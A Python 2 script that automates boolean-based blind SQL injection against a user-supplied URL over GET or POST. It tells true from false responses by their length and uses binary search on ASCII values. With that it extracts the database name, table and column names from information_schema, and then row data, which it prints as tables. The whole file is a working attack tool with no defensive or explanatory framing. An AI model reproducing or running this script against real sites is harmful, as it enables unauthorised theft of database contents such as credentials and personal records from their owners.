import urllib2, urllib
import time

path = ''
mode = ''
querystr = ''
formlst = []
vulform = ''
lentrue = 0
lenfalse = 0
dbname = ''
tables = []
columns = {}
main_data_dict = {}
slp = 0.0

def GetInput():
    global path, mode, querystr, formlst, vulform, slp
    path=raw_input("Enter the vulnerable URL: ")
    mode=raw_input("Enter which type of request you want to make(GET or POST): ")
    querystr = raw_input("Enter the string to be attached prior to the injection(Ex: ' OR): ")

    cnt = 0
    if mode == 'GET':
        path = path + '?'
    elif mode == 'POST':
        cnt = input('Enter the number of form fields that need to be added(including the submit button): ')
        cnt-=1
        print 'Enter the Form tuples(form name, value) including the submit button but not the vulnerable form data'
        for i in range(cnt):
            if i == cnt-1:
                print 'Enter the submit button this time'
            first = raw_input('Enter first tuple: ')
            second = raw_input('Enter second tuple: ')
            formlst.append((first,second))
        vulform = raw_input('Enter the vulnerable form name: ')
    else:
        print 'Wrong Option Selected. Program will give an error.'
    slp = float(raw_input('Enter sleep duration(seconds): '))


def GetLength():
    global lentrue, lenfalse
    if mode == 'POST':
        newform = formlst[:]
        newform.append((vulform, querystr + ' 1=1 -- '))
        newform = urllib.urlencode(newform)
        req=urllib2.Request(path, newform)
        req.add_header("Content-type", "application/x-www-form-urlencoded")
        lentrue = len(urllib2.urlopen(req).read())

        newform = formlst[:]
        newform.append((vulform, querystr + ' 1=2 -- '))
        newform = urllib.urlencode(newform)
        req=urllib2.Request(path, newform)
        req.add_header("Content-type", "application/x-www-form-urlencoded")
        lenfalse = len(urllib2.urlopen(req).read())
    elif mode == 'GET':
        newpath = path + querystr + ' 1=1 -- '
        #print newpath
        req = urllib2.Request(newpath)
        lentrue = len(urllib2.urlopen(req).read())
        #print lentrue

        newpath = path + querystr + ' 1=2 -- '
        #print newpath
        req = urllib2.Request(newpath)
        lenfalse = len(urllib2.urlopen(req).read())
        #print lenfalse

        if lenfalse == lentrue:
            raise Exception('This website can not be exploited')


def FindDatabase():
    global dbname
    name = []
    for ind in range(1,30):
        flag = 0
        nlow = 48
        nhigh = 128
        oldn = -99
        while(1):
            n = (nlow + nhigh)/2
            if n == oldn:
                break
            oldn = n
            
            vulstr = querystr + " ASCII(SUBSTRING(database()," + str(ind) + ",1)) = " + str(n) + " -- "
            print vulstr
            if mode == 'POST':
                newform = formlst[:]
                newform.append((vulform, vulstr))
                newform=urllib.urlencode(newform)

                req=urllib2.Request(path, newform)
                req.add_header("Content-type", "application/x-www-form-urlencoded")
                lenquery = len(urllib2.urlopen(req).read())
            elif mode == 'GET':
                 vulstr = path + vulstr
                 req=urllib2.Request(vulstr)
                 lenquery = len(urllib2.urlopen(req).read())
                 
            if lenquery == lentrue:
                name.append(chr(n))
                flag = 1
                break


            vulstr = querystr + " ASCII(SUBSTRING(database()," + str(ind) + ",1)) < " + str(n) + " -- "
            print vulstr
            if mode == 'POST':
                newform = formlst[:]
                newform.append((vulform, vulstr))
                newform=urllib.urlencode(newform)

                req=urllib2.Request(path, newform)
                req.add_header("Content-type", "application/x-www-form-urlencoded")
                lenquery = len(urllib2.urlopen(req).read())
            elif mode == 'GET':
                 vulstr = path + vulstr
                 req=urllib2.Request(vulstr)
                 lenquery = len(urllib2.urlopen(req).read())
                 
            if lenquery == lentrue:
                nhigh = n
                continue

            vulstr = querystr + " ASCII(SUBSTRING(database()," + str(ind) + ",1)) > " + str(n) + " -- "
            print vulstr
            if mode == 'POST':
                newform = formlst[:]
                newform.append((vulform, vulstr))
                newform=urllib.urlencode(newform)

                req=urllib2.Request(path, newform)
                req.add_header("Content-type", "application/x-www-form-urlencoded")
                lenquery = len(urllib2.urlopen(req).read())
            elif mode == 'GET':
                 vulstr = path + vulstr
                 req=urllib2.Request(vulstr)
                 lenquery = len(urllib2.urlopen(req).read())
                 
            if lenquery == lentrue:
                nlow = n
                continue

            

        if flag == 0:
            break

    dbname = ''.join(name)


#dbname = 'information_schema'
def GetTables():
    global tables
    tables = []
    for tab_index in range(2):
        name = []
        for ch in range(1,30):
            flag = 0
            nlow = 48
            nhigh = 128
            oldalph = -99
            while(1):
                alph = (nlow + nhigh)/2

                if oldalph == alph:
                    break

                oldalph = alph
                
                vulstr = querystr + " (SELECT ASCII(SUBSTRING(TABLE_NAME, " + str(ch) + ", 1)) FROM information_schema.TABLES WHERE TABLE_SCHEMA = '" + dbname + "' limit " + str(tab_index) + ",1) = " + str(alph) + " -- "
                print vulstr
                if mode == 'POST':
                    newform = formlst[:]
                    newform.append((vulform, vulstr))
                    newform=urllib.urlencode(newform)

                    req=urllib2.Request(path, newform)
                    req.add_header("Content-type", "application/x-www-form-urlencoded")
                    lenquery = len(urllib2.urlopen(req).read())
                    #print urllib2.urlopen(req).read()
                elif mode == 'GET':
                    vulstr = path + vulstr
                    req=urllib2.Request(vulstr)
                    lenquery = len(urllib2.urlopen(req).read())

                if lenquery == lentrue:
                    name.append(chr(alph))
                    flag = 1
                    break

                vulstr = querystr + " (SELECT ASCII(SUBSTRING(TABLE_NAME, " + str(ch) + ", 1)) FROM information_schema.TABLES WHERE TABLE_SCHEMA = '" + dbname + "' limit " + str(tab_index) + ",1) < " + str(alph) + " -- "
                print vulstr
                if mode == 'POST':
                    newform = formlst[:]
                    newform.append((vulform, vulstr))
                    newform=urllib.urlencode(newform)

                    req=urllib2.Request(path, newform)
                    req.add_header("Content-type", "application/x-www-form-urlencoded")
                    lenquery = len(urllib2.urlopen(req).read())
                    #print urllib2.urlopen(req).read()
                elif mode == 'GET':
                    vulstr = path + vulstr
                    req=urllib2.Request(vulstr)
                    lenquery = len(urllib2.urlopen(req).read())

                if lenquery == lentrue:
                    nhigh = alph
                    continue

                vulstr = querystr + " (SELECT ASCII(SUBSTRING(TABLE_NAME, " + str(ch) + ", 1)) FROM information_schema.TABLES WHERE TABLE_SCHEMA = '" + dbname + "' limit " + str(tab_index) + ",1) > " + str(alph) + " -- "
                print vulstr
                if mode == 'POST':
                    newform = formlst[:]
                    newform.append((vulform, vulstr))
                    newform=urllib.urlencode(newform)

                    req=urllib2.Request(path, newform)
                    req.add_header("Content-type", "application/x-www-form-urlencoded")
                    lenquery = len(urllib2.urlopen(req).read())
                    #print urllib2.urlopen(req).read()
                elif mode == 'GET':
                    vulstr = path + vulstr
                    req=urllib2.Request(vulstr)
                    lenquery = len(urllib2.urlopen(req).read())

                if lenquery == lentrue:
                    nlow = alph
                    continue
            if flag == 0:
                break
        if(name):
            tables.append(''.join(name))


#tables = ['artists']
def GetColumns():
    #print formlst
    global columns
    columns = {}
    for table in tables:
        fin_lst = []
        for numCol in range(5):
            lst = []
            for col_ind in range(1,30):
                flag = 0
                nlow = 48
                nhigh = 128
                oldalph = -99
                while(1):
                    time.sleep(slp)
                    alph = (nlow + nhigh)/2

                    if oldalph == alph:
                        break

                    oldalph = alph
                    
                    vulstr = querystr + " (SELECT ASCII(SUBSTRING(COLUMN_NAME, " + str(col_ind) + ", 1)) FROM information_schema.COLUMNS WHERE TABLE_NAME = '" + table + "' AND TABLE_SCHEMA = '" + dbname + "' LIMIT " + str(numCol) + ",1) = " + str(alph) + " -- "
                    print vulstr

                    try:
                        if mode == 'POST':
                            newform = formlst[:]
                            newform.append((vulform, vulstr))
                            #print newform
                            newform=urllib.urlencode(newform)

                            req=urllib2.Request(path, newform)
                            req.add_header("Content-type", "application/x-www-form-urlencoded")
                            #print urllib2.urlopen(req).read()
                            lenquery = len(urllib2.urlopen(req).read())
                        elif mode == 'GET':
                            vulstr = path + vulstr
                            req=urllib2.Request(vulstr)
                            lenquery = len(urllib2.urlopen(req).read()) 


                        #print lenquery
                        if lenquery == lentrue:
                            flag = 1
                            lst.append(chr(alph))
                            break

                        vulstr = querystr + " (SELECT ASCII(SUBSTRING(COLUMN_NAME, " + str(col_ind) + ", 1)) FROM information_schema.COLUMNS WHERE TABLE_NAME = '" + table + "' AND TABLE_SCHEMA = '" + dbname + "' LIMIT " + str(numCol) + ",1) < " + str(alph) + " -- "
                        print vulstr

                        if mode == 'POST':
                            newform = formlst[:]
                            newform.append((vulform, vulstr))
                            #print newform
                            newform=urllib.urlencode(newform)

                            req=urllib2.Request(path, newform)
                            req.add_header("Content-type", "application/x-www-form-urlencoded")
                            #print urllib2.urlopen(req).read()
                            lenquery = len(urllib2.urlopen(req).read())
                        elif mode == 'GET':
                            vulstr = path + vulstr
                            req=urllib2.Request(vulstr)
                            lenquery = len(urllib2.urlopen(req).read()) 


                        #print lenquery
                        if lenquery == lentrue:
                            nhigh = alph
                            continue

                        vulstr = querystr + " (SELECT ASCII(SUBSTRING(COLUMN_NAME, " + str(col_ind) + ", 1)) FROM information_schema.COLUMNS WHERE TABLE_NAME = '" + table + "' AND TABLE_SCHEMA = '" + dbname + "' LIMIT " + str(numCol) + ",1) > " + str(alph) + " -- "
                        print vulstr

                        if mode == 'POST':
                            newform = formlst[:]
                            newform.append((vulform, vulstr))
                            #print newform
                            newform=urllib.urlencode(newform)

                            req=urllib2.Request(path, newform)
                            req.add_header("Content-type", "application/x-www-form-urlencoded")
                            #print urllib2.urlopen(req).read()
                            lenquery = len(urllib2.urlopen(req).read())
                        elif mode == 'GET':
                            vulstr = path + vulstr
                            req=urllib2.Request(vulstr)
                            lenquery = len(urllib2.urlopen(req).read()) 


                        #print lenquery
                        if lenquery == lentrue:
                            nlow = alph
                            continue
                    except urllib2.URLError, e:
                        print 'Error'
                        time.sleep(5)
                    except Exception:
                        print 'Client closed connection. We will ignore this result.'
                        time.sleep(5)


                if flag == 0:
                    break

            if(lst):
                print ''.join(lst)
                fin_lst.append(''.join(lst))
            else:
                break
        columns[table] = fin_lst


#columns['artists'] = ['artist_id']
def GetNames():
    global main_data_dict
    main_data_dict = {}
    for table, col in columns.iteritems():
        data_dict = {}
        for column in col:
            data_lst = []
            for out_ind in range(5):
                lst = []
                for in_ind in range(1,10):
                    flag = 0
                    nlow = 48
                    nhigh = 128
                    oldalph = -99
                    while(1):
                        time.sleep(slp)
                        alph = (nlow + nhigh)/2

                        if oldalph == alph:
                            break

                        oldalph = alph
                        
                        vulstr = querystr + " (SELECT ASCII(SUBSTRING(" + column + "," + str(in_ind) + ",1)) FROM " + table + " LIMIT " + str(out_ind) + ",1) = " + str(alph) + " -- ";
                        print vulstr

                        try:
                            if mode == 'POST':
                                newform = formlst[:]
                                newform.append((vulform, vulstr))
                                newform=urllib.urlencode(newform)

                                req=urllib2.Request(path, newform)
                                req.add_header("Content-type", "application/x-www-form-urlencoded")
                                lenquery = len(urllib2.urlopen(req).read())
                            elif mode == 'GET':
                                vulstr = path + vulstr
                                req=urllib2.Request(vulstr)
                                lenquery = len(urllib2.urlopen(req).read()) 

                            if lenquery == lentrue:
                                flag = 1
                                lst.append(chr(alph))
                                break

                            vulstr = querystr + " (SELECT ASCII(SUBSTRING(" + column + "," + str(in_ind) + ",1)) FROM " + table + " LIMIT " + str(out_ind) + ",1) < " + str(alph) + " -- ";
                            print vulstr

                            if mode == 'POST':
                                newform = formlst[:]
                                newform.append((vulform, vulstr))
                                newform=urllib.urlencode(newform)

                                req=urllib2.Request(path, newform)
                                req.add_header("Content-type", "application/x-www-form-urlencoded")
                                lenquery = len(urllib2.urlopen(req).read())
                            elif mode == 'GET':
                                vulstr = path + vulstr
                                req=urllib2.Request(vulstr)
                                lenquery = len(urllib2.urlopen(req).read()) 

                            if lenquery == lentrue:
                                nhigh = alph
                                continue

                            vulstr = querystr + " (SELECT ASCII(SUBSTRING(" + column + "," + str(in_ind) + ",1)) FROM " + table + " LIMIT " + str(out_ind) + ",1) > " + str(alph) + " -- ";
                            print vulstr

                            if mode == 'POST':
                                newform = formlst[:]
                                newform.append((vulform, vulstr))
                                newform=urllib.urlencode(newform)

                                req=urllib2.Request(path, newform)
                                req.add_header("Content-type", "application/x-www-form-urlencoded")
                                lenquery = len(urllib2.urlopen(req).read())
                            elif mode == 'GET':
                                vulstr = path + vulstr
                                req=urllib2.Request(vulstr)
                                lenquery = len(urllib2.urlopen(req).read()) 

                            if lenquery == lentrue:
                                nlow = alph
                                continue

                        except urllib2.URLError, e:
                            print 'Error'
                            time.sleep(5)
                        except Exception:
                            print 'Client closed connection. We will ignore this result.'
                            time.sleep(5)
                            
                    if flag == 0:
                        break

                if(lst):
                    print ''.join(lst)
                    data_lst.append(''.join(lst))
                else:
                    break
            data_dict[column] = data_lst
        main_data_dict[table] = data_dict


GetInput()
begin = time.time()
GetLength()
FindDatabase()
GetTables()
GetColumns()
GetNames()
#print lentrue
#print lenfalse
#print dbname
#print tables
#print columns
print main_data_dict
print ''


l = 0
print 'Name of Database: ' + dbname + '\n\n'
for table, col in main_data_dict.iteritems():
    print 'Table Name : ' + table
    print '--------------------------------------------------------------------------------'
    col_lst = []
    f_dict = {}
    for column, data_lst in col.iteritems():
        col_lst.append(column)
        f_dict[column] = data_lst
        l = len(data_lst)

    for col_s in col_lst:
        print col_s + "\t\t\t",
    print '\n---------------------------------------------------------------------------------'
    for i in range(l):
        for j in col_lst:
            print f_dict[j][i] + '\t\t\t',
        print '\n'
    print '\n\n'
            
    
print '************Data Retrieved in ' + str(time.time() - begin) + ' seconds.************  '


